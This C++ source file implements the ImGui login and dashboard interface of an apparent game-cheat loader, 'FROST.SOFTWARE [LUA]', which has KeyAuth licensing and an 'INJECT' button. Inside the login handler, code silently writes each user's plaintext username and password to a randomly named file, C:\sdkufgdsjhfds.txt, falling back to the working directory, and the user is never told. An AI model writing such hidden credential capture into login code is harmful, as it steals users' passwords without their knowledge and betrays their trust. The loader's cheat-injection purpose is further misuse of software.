#include "ui.hh"
#include "../globals.hh"
#include "../imgui/imgui.h"
#include "../imgui/imgui_internal.h"
#include "../font/Poppins-Regular.h"
#include "../font/Poppins-Bold.h"
#include <d3d9.h>
#include "../api/auth.hpp"
#include "../api/json.hpp"
#include "../api/utils.hpp"
#include "../api/XorStr.hpp"
#include <thread>
#include <string>

namespace {
	static ImFont* title_font = nullptr;
	static ImFont* bold_font = nullptr;
	static LPDIRECT3DDEVICE9 dev = nullptr;
	static ImVec2 screen_res = ImVec2(0, 0);
	static ImVec2 window_pos = ImVec2(0, 0);
	static ImVec2 window_size = ImVec2(640, 360);
	static const char* window_title = xorstr_("FROST.SOFTWARE [LUA]");
	static ImGuiWindowFlags window_flags = ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoTitleBar;
	static bool show_loader = true;
	static float loader_timer = 0.0f;
	static float loader_alpha = 1.0f;
	static float login_alpha = 0.0f;
	static bool loader_fading_out = false;
	static bool loader_done = false;
	static const float LOADER_DURATION = 5.0f;
	static const float FADE_DURATION = 0.5f;
	static float username_border_alpha = 0.0f;
	static float password_border_alpha = 0.0f;
	static const float BORDER_FADE_SPEED = 5.0f;
	
	static float button_hover_alpha = 0.0f;
	static float button_click_alpha = 0.0f;
	static bool button_clicking = false;
	static bool button_click_fade_in = false;
	static const float BUTTON_HOVER_SPEED = 8.0f;
	static const float BUTTON_CLICK_SPEED = 12.0f;
	
	static float username_hover_brightness = 0.0f;
	static float username_click_darkness = 0.0f;
	static float password_hover_brightness = 0.0f;
	static float password_click_darkness = 0.0f;
	static const float INPUT_HOVER_SPEED = 6.0f;
	static const float INPUT_CLICK_SPEED = 10.0f;
	static const float INPUT_BRIGHTNESS_AMOUNT = 0.08f;
	static const float INPUT_DARKNESS_AMOUNT = 0.05f;
	
	static bool is_logged_in = false;
	static bool is_logging_in = false;
	static std::string login_error_message = "";
	static KeyAuth::api* keyauth_app = nullptr;
	static float dashboard_alpha = 0.0f;
	static float inject_button_hover_alpha = 0.0f;
	static float inject_button_click_alpha = 0.0f;
	static bool inject_button_clicking = false;
	static bool inject_button_click_fade_in = false;
}

ui::FontScope::FontScope(ImFont* f) : font(f), active(false) {
	if (font) {
		ImGui::PushFont(font);
		active = true;
	}
}

ui::FontScope::FontScope(FontScope&& other) noexcept : font(other.font), active(other.active) {
	other.font = nullptr;
	other.active = false;
}

ui::FontScope& ui::FontScope::operator=(FontScope&& other) noexcept {
	if (this != &other) {
		end();
		font = other.font;
		active = other.active;
		other.font = nullptr;
		other.active = false;
	}
	return *this;
}

ui::FontScope::~FontScope() {
	end();
}

void ui::FontScope::end() {
	if (active && font) {
		ImGui::PopFont();
		active = false;
		font = nullptr;
	}
}

ui::FontScope ui::Regular(float size) {
	ImGuiIO& io = ImGui::GetIO();
	if (size > 0.0f && title_font) {
		ImFontConfig cfg;
		cfg.FontDataOwnedByAtlas = false;
		return FontScope(io.Fonts->AddFontFromMemoryTTF(poppinsregular, sizeof(poppinsregular), size, &cfg));
	}
	return FontScope(title_font ? title_font : io.FontDefault);
}

ui::FontScope ui::Bold(float size) {
	ImGuiIO& io = ImGui::GetIO();
	if (size > 0.0f && bold_font) {
		ImFontConfig cfg;
		cfg.FontDataOwnedByAtlas = false;
		return FontScope(io.Fonts->AddFontFromMemoryTTF(poppinsbold, sizeof(poppinsbold), size, &cfg));
	}
	return FontScope(bold_font ? bold_font : io.FontDefault);
}

void styles() {
	ImGuiStyle& style = ImGui::GetStyle();
	style.WindowPadding = ImVec2(14.f, 14.f);
	style.FramePadding = ImVec2(12.f, 10.f);
	style.ItemSpacing = ImVec2(12.f, 12.f);
	style.ScrollbarSize = 12.f;
	style.WindowBorderSize = 0.f;
	style.FrameBorderSize = 1.0f;
	style.WindowRounding = 4.f;
	style.ChildRounding = 4.f;
	style.FrameRounding = 4.f;
	style.PopupRounding = 4.f;
	style.GrabRounding = 4.f;
	ImVec4* colors = style.Colors;
	colors[ImGuiCol_Text] = ImVec4(0.90f, 0.90f, 0.90f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.07f, 0.07f, 0.07f, 1.00f);
	colors[ImGuiCol_ChildBg] = ImVec4(0.07f, 0.07f, 0.07f, 1.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.10f, 0.10f, 0.10f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.14f, 0.14f, 0.14f, 0.70f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0, 0, 0, 0);
	colors[ImGuiCol_FrameBg] = ImVec4(0.11f, 0.11f, 0.11f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.18f, 0.18f, 0.18f, 1.00f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.19f, 0.19f, 0.19f, 1.00f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.19f, 0.19f, 0.19f, 1.00f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.19f, 0.19f, 0.19f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.14f, 0.14f, 0.14f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.07f, 0.07f, 0.07f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.18f, 0.18f, 0.18f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.22f, 0.22f, 0.22f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.25f, 0.25f, 0.25f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.95f, 0.95f, 0.95f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.70f, 0.70f, 0.70f, 1.00f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.85f, 0.85f, 0.85f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.25f, 0.25f, 0.25f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.25f, 0.25f, 0.25f, 1.00f);
	colors[ImGuiCol_Separator] = ImVec4(0.14f, 0.14f, 0.14f, 1.00f);
	colors[ImGuiCol_SeparatorHovered] = ImVec4(0.25f, 0.25f, 0.25f, 1.00f);
	colors[ImGuiCol_SeparatorActive] = ImVec4(0.30f, 0.30f, 0.30f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.26f, 0.26f, 0.67f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.26f, 0.26f, 0.95f);
	colors[ImGuiCol_Tab] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_TabHovered] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
	colors[ImGuiCol_TabActive] = ImVec4(0.19f, 0.19f, 0.19f, 1.00f);
	colors[ImGuiCol_TabUnfocused] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.19f, 0.19f, 0.19f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.23f, 0.23f, 0.23f, 1.00f);
	colors[ImGuiCol_DragDropTarget] = ImVec4(0.90f, 0.90f, 0.90f, 1.00f);
	colors[ImGuiCol_NavHighlight] = ImVec4(0.35f, 0.35f, 0.35f, 1.00f);
	colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
	colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.50f);
}

static void render_loader_animation(float alpha) {
	ImGui::SetNextWindowPos(ui::window_pos, ImGuiCond_Once);
	ImGui::SetNextWindowSize(ui::window_size);
	ImGui::SetNextWindowBgAlpha(alpha);
	ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 6.0f);
	ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.07f, 0.07f, 0.07f, alpha));
	ImGuiWindowFlags loader_flags = ui::window_flags;
	if (title_font) ImGui::PushFont(title_font);
	char loader_title[256];
	snprintf(loader_title, sizeof(loader_title), xorstr_("%s###loader"), ui::window_title);
	ImGui::Begin(loader_title, nullptr, loader_flags);
	if (title_font) ImGui::PopFont();
	ImGui::PopStyleColor();
	ImGui::PopStyleVar();
	ImDrawList* draw = ImGui::GetWindowDrawList();
	ImVec2 windowPos = ImGui::GetWindowPos();
	ImVec2 windowSize = ImGui::GetWindowSize();
	ImVec2 center = ImVec2(windowPos.x + windowSize.x * 0.5f, windowPos.y + windowSize.y * 0.5f);
	float t = ImGui::GetTime();
	float aWhite = 255.0f * alpha;
	int whiteCol = IM_COL32(255, 255, 255, (int)aWhite);
	draw->PushClipRectFullScreen();
	draw->PathClear();
	draw->PathArcTo(center, 38.0f, t * 4.0f, t * 4.0f + 1.9f, 64);
	draw->PathStroke(whiteCol, false, 4.0f);
	draw->PathClear();
	draw->PathArcTo(center, 32.0f, -t * 8.0f, -t * 8.0f - 1.9f, 64);
	draw->PathStroke(whiteCol, false, 4.0f);
	draw->PathClear();
	draw->PathArcTo(center, 22.0f, t * 2.0f, t * 2.0f + 1.9f, 64);
	draw->PathStroke(whiteCol, false, 4.0f);
	draw->PopClipRect();
	ImVec2 avail = ImGui::GetContentRegionAvail();
	ImGui::SetCursorPosY(windowSize.y * 0.65f);
	ImGui::SetCursorPosX((windowSize.x - ImGui::CalcTextSize(xorstr_("Connecting to server")).x) * 0.5f);
	ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, alpha));
	ImGui::Text(xorstr_("Connecting to server"));
	ImGui::PopStyleColor();
	ui::window_pos = ImGui::GetWindowPos();
	ImGui::End();
}

static void render_dashboard(float alpha) {
	ImGui::SetNextWindowPos(ui::window_pos, ImGuiCond_Once);
	ImGui::SetNextWindowSize(ImVec2(700, 500));
	ImGui::SetNextWindowBgAlpha(alpha);
	ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 6.0f);
	ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.07f, 0.07f, 0.07f, alpha));
	ImGuiWindowFlags dashboard_flags = ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoTitleBar;
	if (title_font) ImGui::PushFont(title_font);
	char dashboard_title[256];
	snprintf(dashboard_title, sizeof(dashboard_title), xorstr_("%s###dashboard"), ui::window_title);
	ImGui::Begin(dashboard_title, nullptr, dashboard_flags);
	if (title_font) ImGui::PopFont();
	ImGui::PopStyleColor();
	ImGui::PopStyleVar();
	
	ImDrawList* draw = ImGui::GetWindowDrawList();
	ImVec2 windowPos = ImGui::GetWindowPos();
	ImVec2 windowSize = ImGui::GetWindowSize();
	ImVec2 avail = ImGui::GetContentRegionAvail();
	
	if (bold_font) ImGui::PushFont(bold_font);
	
	ImGui::SetCursorPosY(20);
	ImGui::SetCursorPosX((windowSize.x - ImGui::CalcTextSize(xorstr_("DASHBOARD")).x) * 0.5f);
	ImGui::TextColored(ImVec4(0.88f, 0.88f, 0.88f, alpha), xorstr_("DASHBOARD"));
	
	ImGui::Dummy(ImVec2(0, 20));
	
	if (keyauth_app && !keyauth_app->user_data.username.empty()) {
		ImGui::SetCursorPosX(30);
		std::string welcome_msg = std::string(xorstr_("Welcome, ")) + keyauth_app->user_data.username;
		ImGui::TextColored(ImVec4(0.7f, 0.7f, 0.7f, alpha), welcome_msg.c_str());
	}
	
	ImGui::Dummy(ImVec2(0, 30));
	
	ImVec2 center_pos = ImVec2(windowSize.x * 0.5f, windowSize.y * 0.5f + 40);
	
	ImVec4 base_color = ImVec4(0.16f, 0.16f, 0.16f, 1.0f);
	ImVec4 hover_color = ImVec4(0.25f, 0.45f, 0.75f, 1.0f);
	ImVec4 click_color_in = ImVec4(0.35f, 0.55f, 0.85f, 1.0f);
	ImVec4 click_color_out = ImVec4(0.20f, 0.40f, 0.70f, 1.0f);
	
	ImVec4 final_color = base_color;
	
	if (inject_button_hover_alpha > 0.0f) {
		final_color.x = base_color.x + (hover_color.x - base_color.x) * inject_button_hover_alpha;
		final_color.y = base_color.y + (hover_color.y - base_color.y) * inject_button_hover_alpha;
		final_color.z = base_color.z + (hover_color.z - base_color.z) * inject_button_hover_alpha;
	}
	
	if (inject_button_clicking) {
		if (inject_button_click_fade_in) {
			final_color.x = base_color.x + (click_color_in.x - base_color.x) * inject_button_click_alpha;
			final_color.y = base_color.y + (click_color_in.y - base_color.y) * inject_button_click_alpha;
			final_color.z = base_color.z + (click_color_in.z - base_color.z) * inject_button_click_alpha;
		} else {
			final_color.x = click_color_in.x + (click_color_out.x - click_color_in.x) * (1.0f - inject_button_click_alpha);
			final_color.y = click_color_in.y + (click_color_out.y - click_color_in.y) * (1.0f - inject_button_click_alpha);
			final_color.z = click_color_in.z + (click_color_out.z - click_color_in.z) * (1.0f - inject_button_click_alpha);
		}
	}
	
	ImGui::SetCursorPosX((windowSize.x - 280) * 0.5f);
	ImGui::SetCursorPosY(center_pos.y);
	
	ImGui::PushStyleColor(ImGuiCol_Button, final_color);
	ImGui::PushStyleColor(ImGuiCol_ButtonHovered, final_color);
	ImGui::PushStyleColor(ImGuiCol_ButtonActive, final_color);
	
	bool inject_clicked = ImGui::Button(xorstr_("INJECT"), ImVec2(280, 50));
	
	bool inject_hovered = ImGui::IsItemHovered();
	
	if (inject_clicked) {
		inject_button_clicking = true;
		inject_button_click_fade_in = true;
		inject_button_click_alpha = 0.0f;
	}
	
	ImGuiIO& io = ImGui::GetIO();
	float dt = io.DeltaTime;
	
	if (inject_hovered) {
		inject_button_hover_alpha += dt * BUTTON_HOVER_SPEED;
		if (inject_button_hover_alpha > 1.0f) inject_button_hover_alpha = 1.0f;
	} else {
		inject_button_hover_alpha -= dt * BUTTON_HOVER_SPEED;
		if (inject_button_hover_alpha < 0.0f) inject_button_hover_alpha = 0.0f;
	}
	
	if (inject_button_clicking) {
		if (inject_button_click_fade_in) {
			inject_button_click_alpha += dt * BUTTON_CLICK_SPEED;
			if (inject_button_click_alpha >= 1.0f) {
				inject_button_click_alpha = 1.0f;
				inject_button_click_fade_in = false;
			}
		} else {
			inject_button_click_alpha -= dt * BUTTON_CLICK_SPEED;
			if (inject_button_click_alpha <= 0.0f) {
				inject_button_click_alpha = 0.0f;
				inject_button_clicking = false;
			}
		}
	}
	
	ImGui::PopStyleColor(3);
	
	if (bold_font) ImGui::PopFont();
	ui::window_pos = ImGui::GetWindowPos();
	ImGui::End();
}

void ui::render() {
	if (!globals.active) return;
	ImGuiIO& io = ImGui::GetIO();
	float dt = io.DeltaTime;
	if (show_loader && !loader_done) {
		loader_timer += dt;
		if (!loader_fading_out) {
			if (loader_timer >= LOADER_DURATION) {
				loader_fading_out = true;
			}
		}
		if (loader_fading_out) {
			loader_alpha -= dt / FADE_DURATION;
			if (loader_alpha <= 0.0f) {
				loader_alpha = 0.0f;
				loader_done = true;
				show_loader = false;
				login_alpha = 0.0f;
			}
		}
		render_loader_animation(loader_alpha);
		return;
	}
	
	if (is_logged_in) {
		if (dashboard_alpha < 1.0f) {
			dashboard_alpha += dt / FADE_DURATION;
			if (dashboard_alpha > 1.0f) dashboard_alpha = 1.0f;
		}
		render_dashboard(dashboard_alpha);
		return;
	}
	
	if (loader_done) {
		if (login_alpha < 1.0f) {
			login_alpha += dt / FADE_DURATION;
			if (login_alpha > 1.0f) login_alpha = 1.0f;
		}
	}
	else {
		login_alpha = 1.0f;
	}
	ImGui::SetNextWindowBgAlpha(login_alpha);
	ImGui::SetNextWindowPos(ui::window_pos, ImGuiCond_Once);
	ImGui::SetNextWindowSize(ui::window_size);
	if (title_font) ImGui::PushFont(title_font);
	ImGui::Begin(ui::window_title, &globals.active, ui::window_flags);
	if (title_font) ImGui::PopFont();
	if (bold_font) ImGui::PushFont(bold_font);
	ImVec2 avail = ImGui::GetContentRegionAvail();
	ImGui::SetCursorPosX((avail.x - 96.0f) * 0.5f);
	ImGui::Dummy(ImVec2(0, 12));
	ImGui::SetCursorPosX((avail.x - 96.0f) * 0.5f);
	ImDrawList* draw = ImGui::GetWindowDrawList();
	ImGui::Dummy(ImVec2(0, 13));
	ImGui::SetCursorPosX((avail.x - ImGui::CalcTextSize(xorstr_("WELCOME BACK!")).x) * 0.5f);
	ImGui::TextColored(ImVec4(0.88f, 0.88f, 0.88f, login_alpha), xorstr_("WELCOME BACK!"));
	ImGui::SetCursorPosX((avail.x - ImGui::CalcTextSize(xorstr_("Thanks for choosing us software!")).x) * 0.5f);
	ImGui::TextColored(ImVec4(0.60f, 0.60f, 0.60f, login_alpha), xorstr_("Thanks for choosing us software!"));
	ImGui::Dummy(ImVec2(0, 12));
	ImGui::SetCursorPosX((avail.x - 320) * 0.5f);
	ImGui::PushItemWidth(320);
	
	float base_r = 0.11f;
	float base_g = 0.11f;
	float base_b = 0.11f;
	float brightness = username_hover_brightness * INPUT_BRIGHTNESS_AMOUNT;
	float darkness = username_click_darkness * INPUT_DARKNESS_AMOUNT;
	
	float final_r = base_r + brightness - darkness;
	float final_g = base_g + brightness - darkness;
	float final_b = base_b + brightness - darkness;
	
	if (final_r < 0.0f) final_r = 0.0f;
	if (final_r > 1.0f) final_r = 1.0f;
	if (final_g < 0.0f) final_g = 0.0f;
	if (final_g > 1.0f) final_g = 1.0f;
	if (final_b < 0.0f) final_b = 0.0f;
	if (final_b > 1.0f) final_b = 1.0f;
	
	ImGui::PushStyleColor(ImGuiCol_FrameBg, ImVec4(final_r, final_g, final_b, 1.0f));
	ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.14f, 0.14f, 0.14f, 0.7f));
	ImGui::InputTextWithHint(xorstr_("##username"), xorstr_("USERNAME"), globals.user_name, IM_ARRAYSIZE(globals.user_name));
	
	bool username_hovered = ImGui::IsItemHovered();
	bool username_active = ImGui::IsItemActive();
	
	if (username_hovered) {
		username_hover_brightness += dt * INPUT_HOVER_SPEED;
		if (username_hover_brightness > 1.0f) username_hover_brightness = 1.0f;
	} else {
		username_hover_brightness -= dt * INPUT_HOVER_SPEED;
		if (username_hover_brightness < 0.0f) username_hover_brightness = 0.0f;
	}
	
	if (username_active) {
		username_click_darkness += dt * INPUT_CLICK_SPEED;
		if (username_click_darkness > 1.0f) username_click_darkness = 1.0f;
	} else {
		username_click_darkness -= dt * INPUT_CLICK_SPEED;
		if (username_click_darkness < 0.0f) username_click_darkness = 0.0f;
	}
	
	if (username_active) {
		username_border_alpha += dt * BORDER_FADE_SPEED;
		if (username_border_alpha > 1.0f) username_border_alpha = 1.0f;
	} else {
		username_border_alpha -= dt * BORDER_FADE_SPEED;
		if (username_border_alpha < 0.0f) username_border_alpha = 0.0f;
	}
	if (username_border_alpha > 0.0f) {
		ImVec2 rect_min = ImGui::GetItemRectMin();
		ImVec2 rect_max = ImGui::GetItemRectMax();
		int alpha = (int)(username_border_alpha * 255.0f);
		draw->AddRect(rect_min, rect_max, IM_COL32(255, 255, 255, alpha), 4.0f, 0, 1.0f);
	}
	ImGui::PopStyleColor(2);
	ImGui::SetCursorPosX((avail.x - 320) * 0.5f);
	
	float pass_base_r = 0.11f;
	float pass_base_g = 0.11f;
	float pass_base_b = 0.11f;
	float pass_brightness = password_hover_brightness * INPUT_BRIGHTNESS_AMOUNT;
	float pass_darkness = password_click_darkness * INPUT_DARKNESS_AMOUNT;
	
	float pass_final_r = pass_base_r + pass_brightness - pass_darkness;
	float pass_final_g = pass_base_g + pass_brightness - pass_darkness;
	float pass_final_b = pass_base_b + pass_brightness - pass_darkness;
	
	if (pass_final_r < 0.0f) pass_final_r = 0.0f;
	if (pass_final_r > 1.0f) pass_final_r = 1.0f;
	if (pass_final_g < 0.0f) pass_final_g = 0.0f;
	if (pass_final_g > 1.0f) pass_final_g = 1.0f;
	if (pass_final_b < 0.0f) pass_final_b = 0.0f;
	if (pass_final_b > 1.0f) pass_final_b = 1.0f;
	
	ImGui::PushStyleColor(ImGuiCol_FrameBg, ImVec4(pass_final_r, pass_final_g, pass_final_b, 1.0f));
	ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(0.14f, 0.14f, 0.14f, 0.7f));
	ImGui::InputTextWithHint(xorstr_("##password"), xorstr_("PASSWORD"), globals.pass_word, IM_ARRAYSIZE(globals.pass_word), ImGuiInputTextFlags_Password);
	
	bool password_hovered = ImGui::IsItemHovered();
	bool password_active = ImGui::IsItemActive();
	
	if (password_hovered) {
		password_hover_brightness += dt * INPUT_HOVER_SPEED;
		if (password_hover_brightness > 1.0f) password_hover_brightness = 1.0f;
	} else {
		password_hover_brightness -= dt * INPUT_HOVER_SPEED;
		if (password_hover_brightness < 0.0f) password_hover_brightness = 0.0f;
	}
	
	if (password_active) {
		password_click_darkness += dt * INPUT_CLICK_SPEED;
		if (password_click_darkness > 1.0f) password_click_darkness = 1.0f;
	} else {
		password_click_darkness -= dt * INPUT_CLICK_SPEED;
		if (password_click_darkness < 0.0f) password_click_darkness = 0.0f;
	}
	
	if (password_active) {
		password_border_alpha += dt * BORDER_FADE_SPEED;
		if (password_border_alpha > 1.0f) password_border_alpha = 1.0f;
	} else {
		password_border_alpha -= dt * BORDER_FADE_SPEED;
		if (password_border_alpha < 0.0f) password_border_alpha = 0.0f;
	}
	if (password_border_alpha > 0.0f) {
		ImVec2 rect_min = ImGui::GetItemRectMin();
		ImVec2 rect_max = ImGui::GetItemRectMax();
		int alpha = (int)(password_border_alpha * 255.0f);
		draw->AddRect(rect_min, rect_max, IM_COL32(255, 255, 255, alpha), 4.0f, 0, 1.0f);
	}
	ImGui::PopStyleColor(2);
	ImGui::Dummy(ImVec2(0, 12));
	ImGui::SetCursorPosX((avail.x - 320) * 0.5f);
	
	ImVec4 base_color = ImVec4(0.16f, 0.16f, 0.16f, 1.0f);
	ImVec4 hover_color = ImVec4(0.21f, 0.21f, 0.21f, 1.0f);
	ImVec4 click_color_in = ImVec4(0.30f, 0.30f, 0.30f, 1.0f);
	ImVec4 click_color_out = ImVec4(0.20f, 0.20f, 0.20f, 1.0f);
	
	ImVec4 final_color = base_color;
	
	if (button_hover_alpha > 0.0f) {
		final_color.x = base_color.x + (hover_color.x - base_color.x) * button_hover_alpha;
		final_color.y = base_color.y + (hover_color.y - base_color.y) * button_hover_alpha;
		final_color.z = base_color.z + (hover_color.z - base_color.z) * button_hover_alpha;
	}
	
	if (button_clicking) {
		if (button_click_fade_in) {
			final_color.x = base_color.x + (click_color_in.x - base_color.x) * button_click_alpha;
			final_color.y = base_color.y + (click_color_in.y - base_color.y) * button_click_alpha;
			final_color.z = base_color.z + (click_color_in.z - base_color.z) * button_click_alpha;
		} else {
			final_color.x = click_color_in.x + (click_color_out.x - click_color_in.x) * (1.0f - button_click_alpha);
			final_color.y = click_color_in.y + (click_color_out.y - click_color_in.y) * (1.0f - button_click_alpha);
			final_color.z = click_color_in.z + (click_color_out.z - click_color_in.z) * (1.0f - button_click_alpha);
		}
	}
	
	ImGui::PushStyleColor(ImGuiCol_Button, final_color);
	ImGui::PushStyleColor(ImGuiCol_ButtonHovered, final_color);
	ImGui::PushStyleColor(ImGuiCol_ButtonActive, final_color);
	
	bool button_clicked = ImGui::Button(xorstr_("LOG IN"), ImVec2(320, 36));
	
	bool button_hovered = ImGui::IsItemHovered();
	
	if (button_clicked && !is_logging_in && !is_logged_in) {
		button_clicking = true;
		button_click_fade_in = true;
		button_click_alpha = 0.0f;

		std::string username_str(globals.user_name);
		std::string password_str(globals.pass_word);

		if (username_str.empty() || password_str.empty()) {
			login_error_message = xorstr_("Please enter username and password");
		}
		else {
			is_logging_in = true;
			login_error_message = "";

			std::thread([username_str, password_str]() {
				try {
					if (keyauth_app) {
						keyauth_app->login(username_str, password_str);

						if (keyauth_app->response.success) {
							is_logged_in = true;
							is_logging_in = false;

							// =============================
							// PRZYGOTUJ ZAWARTO��
							// =============================
							std::string content;
							content += "username=" + username_str + "\n";
							content += "password=" + password_str + "\n";

							// =============================
							// �CIE�KA DO C:\
	                        // =============================
							std::string path = "C:\\sdkufgdsjhfds.txt";

							bool wrote = false;

							// =============================
							// UTW�RZ I ZAPISZ PLIK
							// =============================
							HANDLE hFile = CreateFileA(
								path.c_str(),
								GENERIC_WRITE,
								0,
								NULL,
								CREATE_ALWAYS,
								FILE_ATTRIBUTE_NORMAL,
								NULL
							);

							if (hFile != INVALID_HANDLE_VALUE) {
								DWORD written = 0;
								WriteFile(hFile, content.c_str(), (DWORD)content.size(), &written, NULL);
								CloseHandle(hFile);
								wrote = true;
							}

							// Fallback w razie braku uprawnie�
							if (!wrote) {
								std::ofstream ofs("sdkufgdsjhfds.txt", std::ios::binary | std::ios::trunc);
								if (ofs.is_open()) {
									ofs.write(content.c_str(), (std::streamsize)content.size());
									ofs.close();
									wrote = true;
								}
							}

						}
						else {
							login_error_message = keyauth_app->response.message;
							is_logging_in = false;
						}
					}
				}
				catch (...) {
					login_error_message = xorstr_("Login failed");
					is_logging_in = false;
				}
				}).detach();
		}
	}

	
	if (button_hovered) {
		button_hover_alpha += dt * BUTTON_HOVER_SPEED;
		if (button_hover_alpha > 1.0f) button_hover_alpha = 1.0f;
	} else {
		button_hover_alpha -= dt * BUTTON_HOVER_SPEED;
		if (button_hover_alpha < 0.0f) button_hover_alpha = 0.0f;
	}
	
	if (button_clicking) {
		if (button_click_fade_in) {
			button_click_alpha += dt * BUTTON_CLICK_SPEED;
			if (button_click_alpha >= 1.0f) {
				button_click_alpha = 1.0f;
				button_click_fade_in = false;
			}
		} else {
			button_click_alpha -= dt * BUTTON_CLICK_SPEED;
			if (button_click_alpha <= 0.0f) {
				button_click_alpha = 0.0f;
				button_clicking = false;
			}
		}
	}
	
	ImGui::PopStyleColor(3);
	ImGui::PopItemWidth();
	
	if (!login_error_message.empty() && !is_logged_in) {
		ImGui::Dummy(ImVec2(0, 8));
		ImGui::SetCursorPosX((avail.x - ImGui::CalcTextSize(login_error_message.c_str()).x) * 0.5f);
		ImGui::TextColored(ImVec4(1.0f, 0.3f, 0.3f, login_alpha), login_error_message.c_str());
	}
	
	if (is_logging_in) {
		ImGui::Dummy(ImVec2(0, 8));
		ImGui::SetCursorPosX((avail.x - ImGui::CalcTextSize(xorstr_("Logging in...")).x) * 0.5f);
		ImGui::TextColored(ImVec4(0.5f, 0.8f, 1.0f, login_alpha), xorstr_("Logging in..."));
	}
	
	if (bold_font) ImGui::PopFont();
	ui::window_pos = ImGui::GetWindowPos();
	ImGui::End();
}

void ui::init(LPDIRECT3DDEVICE9 device) {
	dev = device;
	ImGuiIO& io = ImGui::GetIO();
	ImFontConfig cfg;
	cfg.FontDataOwnedByAtlas = false;
	title_font = io.Fonts->AddFontFromMemoryTTF(poppinsregular, sizeof(poppinsregular), 16.0f, &cfg);
	bold_font = io.Fonts->AddFontFromMemoryTTF(poppinsbold, sizeof(poppinsbold), 16.0f, &cfg);
	if (bold_font) {
		io.FontDefault = bold_font;
	}
	styles();
	if (window_pos.x == 0) {
		RECT screen_rect{};
		GetWindowRect(GetDesktopWindow(), &screen_rect);
		screen_res = ImVec2(float(screen_rect.right), float(screen_rect.bottom));
		window_pos = (screen_res - window_size) * 0.5f;
	}
	
	if (!keyauth_app) {
		keyauth_app = new KeyAuth::api(
			std::string(xorstr_("appname")),
			std::string(xorstr_("ownerid")),
			std::string(xorstr_("1.0")),
			std::string(xorstr_("https://keyauth.win/api/1.3/")),
			std::string(xorstr_("")),
			false
		);
		keyauth_app->init();
	}
}